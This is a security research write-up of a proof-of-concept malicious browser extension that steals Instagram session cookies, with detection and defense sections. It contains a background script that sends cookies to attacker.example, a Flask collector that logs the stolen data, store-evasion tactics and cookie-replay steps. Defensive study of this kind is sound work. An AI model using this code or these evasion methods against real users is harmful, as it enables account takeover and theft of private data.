---
title: "Instagram Session Hijacking — Malicious Extension PoC"
description: "A browser extension that steals session cookies from Instagram, exfiltrates them to a Flask collector, and demonstrates why unverified extensions are a first-class threat. Also: why HttpOnly does not save you."
date: 2025-12-19
status: "research"
category: "Social Engineering"
stack: [Python, Flask, JavaScript, Chrome MV3, Firefox MV2, HTML/CSS]
repo: "https://github.com/jonas-fernandez-as/malicious-extension-poc"
video: "https://youtu.be/LyeTdyoM4MQ"
tags: [session-hijacking, browser-extension, cookies, phishing, httponly]
---

## The premise

Browser extensions have permissions that most users never read. A single extension with `cookies` and `host_permissions` for `*.instagram.com` can read every session cookie the site has set. If those cookies are `HttpOnly` — which they are, on every serious web application — the flag is irrelevant. The extension API bypasses it entirely.

This is not a bug in the browser, and it is not a vulnerability in the extension platform. It is the platform working exactly as designed. Extensions are privileged code that the user explicitly installs, and the permission model is the only gate. The problem is that the permission model is invisible to most users, and a malicious extension that asks for reasonable-sounding permissions will pass without inspection.

This project is a complete PoC of the attack chain: malicious extension, collector server, fake landing page, and session hijack. It has been demonstrated publicly as an educational resource, and the same techniques are actively used in real campaigns — particularly against Instagram, TikTok, and Facebook accounts, which are high-value targets for resale.

The writeup covers the technical mechanics, the defenses that actually work, and the ones that don't.

## Part one — why extensions are a distinct threat

A browser extension is not a webpage. It does not run inside the same security context as the site it interacts with. It runs in a separate context with elevated privileges, controlled by the `permissions` field in its `manifest.json`.

This distinction matters because it means the security boundaries that protect a page from other pages do not apply to an extension. Specifically:

**The same-origin policy does not apply.** A webpage on `evil.com` cannot read cookies for `instagram.com`. An extension with the right permission can read cookies for every domain the user has ever visited.

**`HttpOnly` does not apply.** The `HttpOnly` flag on a cookie prevents JavaScript running inside the page from reading that cookie via `document.cookie`. It does not prevent the browser's own extension API from reading the cookie via `chrome.cookies.getAll`. The flag was designed to prevent XSS attacks; it was never designed to constrain extensions, because extensions were assumed to be trusted.

**CORS does not apply.** An extension with the right `host_permissions` can make cross-origin requests to any domain in the permission set, without the preflight checks that would block a normal webpage.

**Content Security Policy does not apply to extension code.** The CSP that a website sets applies to scripts running in that website's context. Extension code has its own CSP, controlled by the extension manifest.

The combined effect: an extension is a piece of software that runs with a level of privilege that no webpage has ever had, and the only gate is the user clicking "Add to Chrome" on a permission prompt that most users will not read.

## Part two — the permission model

The reason this PoC works in Chrome Manifest V3 (the current standard as of 2024) and Firefox Manifest V2 (Firefox's MV3 support is partial) comes down to two fields in `manifest.json`:

```json
{
  "manifest_version": 3,
  "name": "Photo Filters Pro",
  "version": "1.0.0",
  "permissions": ["cookies"],
  "host_permissions": ["*://*.instagram.com/*"],
  "background": {
    "service_worker": "background.js"
  }
}
```

Two things to notice:

**`permissions: ["cookies"]`** grants access to the cookie API. This permission is presented to the user at install time as "Read and change cookies", which sounds benign to a user who does not know what cookies are.

**`host_permissions: ["*://*.instagram.com/*"]`** limits the cookie access to Instagram specifically. A narrower permission set is actually *better* for the attacker, because it looks less suspicious — a "Photo Filters Pro" extension that wants to read Instagram data is plausible.

With these two permissions, the extension can do the following in its background script:

```js
chrome.cookies.getAll({ domain: ".instagram.com" }, (cookies) => {
  fetch("https://attacker.example/collect", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      cookies: cookies,
      userAgent: navigator.userAgent,
      timestamp: Date.now()
    })
  });
});
```

That is the entire attack. Two lines of logic, four lines of plumbing, one network request. The `sessionid` cookie in the returned set is what Instagram's server uses to authenticate requests. With it, the attacker can impersonate the victim from any browser, any machine, anywhere.

## Part three — MV2 vs MV3

The two manifest versions handle the permissions differently, and both are in scope for this project.

**Manifest V2 (Firefox, legacy Chrome).** Background scripts are persistent. The extension declares permissions at install time, and those permissions remain for the extension's lifetime. The `chrome.cookies` API works the same way as MV3, but the background page is a persistent HTML document, which makes timing-based attacks easier.

**Manifest V3 (current Chrome).** Background scripts are service workers that terminate when idle. The extension declares permissions the same way, but the service worker model means the extension must register event listeners carefully — the worker wakes when an event fires and sleeps otherwise. For the cookie-stealing use case, this is a minor complication: the extension registers a `chrome.tabs.onUpdated` listener that fires when the user navigates to `instagram.com`, and the service worker wakes up, executes the cookie dump, and returns to sleep.

Both versions work identically from the victim's perspective. The choice between them depends on which browser the target uses and which extension store will accept the extension.

## Part four — the delivery vector

The extension itself is trivial. The hard part is getting the victim to install it.

The delivery vector in this PoC is a **fake landing page**. A professional-looking site — a "photo filter" or "Instagram boost" or "profile viewer" — that instructs the visitor to install a browser extension for the feature to work. The page includes a button that opens the extension store listing (for Chrome, this is the Chrome Web Store; for Firefox, addons.mozilla.org).

The trick is that the extension must pass review. Both stores have automated scanning that flags obvious cookie-stealers, and both reject extensions that request permissions clearly disproportionate to their stated function. A "Photo Filters Pro" extension that requests `cookies` for Instagram will be flagged if a human reviews it.

Three workarounds that real campaigns use:

**Delayed activation.** The extension requests the permissions but does not perform the theft immediately. It waits days or weeks, doing its legitimate function first. By the time the theft happens, the extension has been installed and reviewed, and the store has no reason to re-check.

**Obfuscated code.** The theft logic is packed, encrypted, or fetched from a remote server at runtime. The static code in the manifest passes review; the actual behavior happens when the extension is installed and running. This is against the terms of both stores but is difficult to detect at scale.

**External distribution.** The extension is distributed outside the official stores, via a direct `.crx` download or via instructions to "load unpacked". Chrome and Firefox both allow loading unpacked extensions for development, and users who follow these instructions to sideload a suspicious extension have effectively bypassed the store review process.

The fake landing page in this PoC uses the third approach. It is the most direct way to demonstrate the technique and the least dependent on store evasion.

## Part five — the collector server

The collector is a Flask application with a single endpoint:

```python
from flask import Flask, request
import json, datetime

app = Flask(__name__)

@app.route("/collect", methods=["POST"])
def collect():
    data = request.get_json()
    timestamp = datetime.datetime.utcnow().isoformat()
    with open("stolen.jsonl", "a") as f:
        f.write(json.dumps({"ts": timestamp, "data": data}) + "\n")
    return "OK", 200

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)
```

The server accepts the POST from the extension, appends the payload to a log file, and returns 200. No database, no authentication, no rate limiting — this is a demonstration, not a production C2.

The reason the server is worth mentioning at all is that its existence defines a detection opportunity. A browser extension making periodic HTTP requests to a fixed domain that is not on any allowlist is anomalous. Most enterprise environments do not monitor extension traffic specifically, but a network layer that flags outbound requests to non-corporate domains catches this.

## Part six — the session hijack

Once the attacker has the cookies, they can replay them from any browser. The process is mechanical:

1. **Import the cookies.** Using a tool like Cookie-Editor or a manual injection via the browser's developer console, import the stolen cookie set into the attacker's browser.
2. **Navigate to the target site.** With the cookies set, loading `instagram.com` sends the `sessionid` cookie automatically.
3. **Authenticated.** The server sees a request with a valid session cookie and grants access. The attacker is now logged in as the victim.

No password prompt, no MFA, no device challenge (in most cases). Instagram's defenses against stolen cookies are limited to:
- **Device fingerprinting** — the attacker's browser has a different fingerprint than the victim's. Instagram may flag this and require re-authentication. This is imperfect — different devices are a normal user pattern, and Instagram cannot always distinguish the two.
- **IP-based session binding** — some services bind sessions to a coarse network signature. Instagram does not enforce this strictly for regular users.
- **Session revocation on suspicious activity** — Instagram may force re-login if it detects anomalous behavior. The attacker's window is limited by how long the session remains valid before Instagram decides the behavior is suspicious.

The practical result: the attacker has minutes to hours of authenticated access. For most attacks — exfiltrating DMs, changing the account email, posting content, or reselling the account — that is more than enough time.

## Part seven — why HttpOnly does not save you

This deserves a section of its own because it is the part that surprises people.

`HttpOnly` is a cookie attribute that tells the browser "do not expose this cookie to JavaScript running inside the page." It was introduced to mitigate XSS attacks — if an attacker injects JavaScript into a page, that script cannot read the session cookie, so it cannot exfiltrate it.

The flag works. It is one of the most important defenses against XSS.

What it does not do is constrain the browser's own extension APIs. When an extension calls `chrome.cookies.getAll`, it is not going through the page's JavaScript context. It is going through a privileged API that the browser implements specifically to give extensions access to cookie data — including `HttpOnly` cookies.

From the browser's perspective, this is correct behavior. The extension was granted the `cookies` permission by the user at install time. The `HttpOnly` flag is a defense against *untrusted code running inside the page*, not a defense against *trusted code that the user installed*. The distinction is semantic and matters enormously.

The practical consequence: any extension with `cookies` permission has full access to every session cookie on every domain it has `host_permissions` for, regardless of `HttpOnly`, `Secure`, or `SameSite`. The cookie flags were never designed to protect against this.

## Part eight — detection

From the defender's perspective, this technique leaves traces at multiple layers.

### Extension side

**Extension inventory.** Enterprise Chrome and Firefox both support allowlisting extensions. Any extension not on the allowlist should not install. This is the single most effective control.

**Permission monitoring.** A new extension that requests `cookies` or `<all_urls>` host permissions should trigger an alert. Users who install extensions frequently will generate noise, but the signal-to-noise ratio improves when the alert is limited to extensions that request permission combinations that are disproportionate to their stated function.

**Network traffic from extensions.** Extension service workers make network requests. In most enterprise environments, these are not distinguished from regular browser traffic. A network layer that flags outbound requests to non-corporate domains from browser-related processes catches the exfiltration.

### Host side

**Process injection.** If the extension uses a native messaging host (a separate binary that the extension can invoke), the binary's creation is logged by Sysmon Event ID 1. This only applies to extensions that use native messaging — the PoC in this project does not.

**File writes.** If the extension writes stolen data to disk, that write is logged. If the extension exfiltrates directly via `fetch`, no file write occurs, and this detection does not apply.

### Network side

**DNS queries for the collector domain.** The extension resolves the collector's domain before connecting. If the domain is new or previously unseen in the environment, the resolution is anomalous. DNS monitoring catches this reliably.

**TLS SNI mismatch.** The extension's requests use the collector's domain in SNI. If the destination IP is not associated with that domain in any public registry, the pattern is suspicious — same technique used in the browser-into-browser detection.

**Volume patterns.** Regular, small, periodic POST requests to a non-corporate domain from a browser process are anomalous. A correlation rule that fires on "browser process → non-corporate domain → POST → small payload → repeating" catches most variants.

## Part nine — defense

The controls that actually work:

**Restrict extension installation.** Chrome Enterprise and Firefox ESR both support policies that allowlist extensions. `ExtensionInstallAllowlist` and `ExtensionInstallBlocklist` in Chrome's enterprise policy allow an organization to enforce an approved set. This is the single highest-leverage control — if the extension cannot install, the attack does not happen.

**Review extension permissions in the browser.** For individual users, the check is simple: navigate to `chrome://extensions`, click on each extension, and verify that the permissions match what the extension claims to do. A "photo filter" that wants cookie access to `instagram.com` is not a photo filter.

**Use a password manager with device binding.** If the attacker's browser has a different device fingerprint, some services will require additional authentication on session replay. This is not universal — Instagram is not strict about it — but for high-value accounts (email, banking, corporate SSO), the binding is more common.

**Bind sessions to network signatures.** Service-side, this is a meaningful defense. If a session cookie is only valid from the IP range where the login occurred, a stolen cookie is useless from a different location. Some services implement this; most do not, because it breaks legitimate use cases (mobile switching between WiFi and cellular).

**Monitor for known IOCs.** If the collector domain is already known — from previous campaigns, from threat intel feeds, from internal reports — a DNS or HTTP layer that blocks or alerts on that domain catches the exfiltration. This is reactive, not preventive, but it catches repeated campaigns.

**MFA with device binding.** FIDO2 security keys bind the authentication to a specific hardware device. Even if the session cookie is stolen, the attacker cannot establish a new session without the physical key. This does not prevent the initial theft — the stolen cookie is still usable until the session expires — but it limits the duration of access.

## Part ten — what this is not

The limits of the demonstration:

**No persistence.** The extension stays installed until the user removes it, but it does not modify the system beyond that. Once uninstalled, the attack is over.

**No privilege escalation.** The extension runs as the user, with the user's permissions. It cannot read system-level secrets or modify protected files.

**No novel technique.** Everything here is publicly documented. The value is in the demonstration and the defensive analysis, not in the offensive novelty.

**Not a store-published extension.** The PoC is loaded unpacked, not published to any store. Real campaigns that use stores take additional steps to pass review, as described above.

## Part eleven — the broader lesson

The browser extension platform is one of the few remaining places on a modern system where a single user action grants broad, persistent, privileged access to a piece of code that the user cannot meaningfully audit. App stores on mobile have similar issues but with stricter review. Native desktop software requires explicit installation of a signed binary.

Extensions sit in a middle ground: easy to install, difficult to review, persistent once installed, and privileged enough to read every session cookie the user has. The permission model is the only gate, and the permission prompt is not designed to be informative — it is designed to be dismissed.

The right response is not to tell users to read the permission prompt. It is to enforce extension allowlisting at the organizational level, and for individual users to treat browser extensions the way they treat any other piece of software: as a trust decision with consequences.

An extension is not a theme. It is not a filter. It is code that the user has granted the ability to read everything the browser can see. That is worth a few seconds of attention before clicking install.

## Takeaway

The session cookie is a bearer token. Whoever holds it is the authenticated user. `HttpOnly` protects it from XSS but not from extensions. CORS protects it from cross-origin webpages but not from privileged code. Every browser-level defense against cookie theft is downstream of the assumption that the code reading the cookie is trusted.

A malicious extension breaks that assumption. It is trusted by the browser, because the user installed it. The trust is misplaced, and there is no technical mechanism that distinguishes a good extension from a bad one at install time — only the permission prompt, and only if someone reads it.

The most sophisticated endpoint protection in the world cannot stop a user from clicking "Add to Chrome" on an extension that wants to read their cookies. Extension allowlisting is the only control that does.
